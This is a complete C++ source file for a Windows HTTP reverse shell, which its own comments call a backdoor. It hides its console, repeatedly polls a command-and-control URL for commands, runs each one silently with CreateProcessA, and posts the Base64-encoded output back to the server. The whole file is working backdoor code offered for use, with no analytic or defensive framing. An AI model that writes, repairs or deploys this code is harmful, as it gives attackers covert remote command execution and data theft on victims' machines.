// HTTP REVERSE SHELL - C++ VERSION - FIXED
// Compile: g++ backdoor2_fixed.cpp -o backdoor2.exe -lwininet -static

#include <windows.h>
#include <wininet.h>
#include <string>
#include <sstream>
#include <fstream>
#include <cstring>
#pragma comment(lib, "wininet.lib")

// Force ANSI versions
#ifdef UNICODE
#undef UNICODE
#endif
#ifdef _UNICODE
#undef _UNICODE
#endif

#define SERVER_URL "http://192.168.1.100:8080"  // CHANGE THIS
#define INTERVAL 3000  // 3 seconds

class HTTPReverseShell {
private:
    HINTERNET hInternet;
    
    std::string Base64Encode(const std::string& in) {
        static const char b64[] = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string out;
        int val = 0, valb = -6;
        
        for (unsigned char c : in) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                out.push_back(b64[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) out.push_back(b64[((val << 8) >> (valb + 8)) & 0x3F]);
        while (out.size() % 4) out.push_back('=');
        return out;
    }
    
    std::string HttpGet(const std::string& url) {
        std::string result;
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), 
            NULL, 0, INTERNET_FLAG_RELOAD, 0);
        
        if (hConnect) {
            char buffer[4096];
            DWORD bytesRead;
            while (InternetReadFile(hConnect, buffer, sizeof(buffer)-1, &bytesRead) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
            InternetCloseHandle(hConnect);
        }
        return result;
    }
    
    bool HttpPost(const std::string& url, const std::string& data) {
        // Convert string to LPCSTR for WinINet
        LPCSTR headers = "Content-Type: text/plain\r\n";
        
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), 
            headers, strlen(headers), 
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        
        if (hConnect) {
            // Send data
            DWORD bytesWritten;
            HttpSendRequestA(hConnect, headers, strlen(headers), 
                (LPVOID)data.c_str(), data.length());
            InternetCloseHandle(hConnect);
            return true;
        }
        return false;
    }
    
    std::string ExecuteCommand(const char* cmd) {
        char buffer[4096];
        std::string result;
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
            return "Error creating pipe";
        }
        
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        
        // Create mutable copy of command
        char* cmdMutable = _strdup(cmd);
        
        if (CreateProcessA(NULL, cmdMutable, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        free(cmdMutable);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        return result.empty() ? "[OK]" : result;
    }
    
public:
    HTTPReverseShell() {
        hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, 
            NULL, NULL, 0);
        FreeConsole();  // Hide window
    }
    
    ~HTTPReverseShell() {
        if (hInternet) InternetCloseHandle(hInternet);
    }
    
    void Run() {
        while (true) {
            std::string url = std::string(SERVER_URL) + "/poll";
            std::string cmd = HttpGet(url);
            
            if (!cmd.empty() && cmd != "none" && cmd != "null") {
                std::string output = ExecuteCommand(cmd.c_str());
                std::string encoded = Base64Encode(output);
                
                std::string postUrl = std::string(SERVER_URL) + "/result";
                HttpPost(postUrl, encoded);
            }
            
            Sleep(INTERVAL);
        }
    }
};

int main() {
    HTTPReverseShell shell;
    shell.Run();
    return 0;
}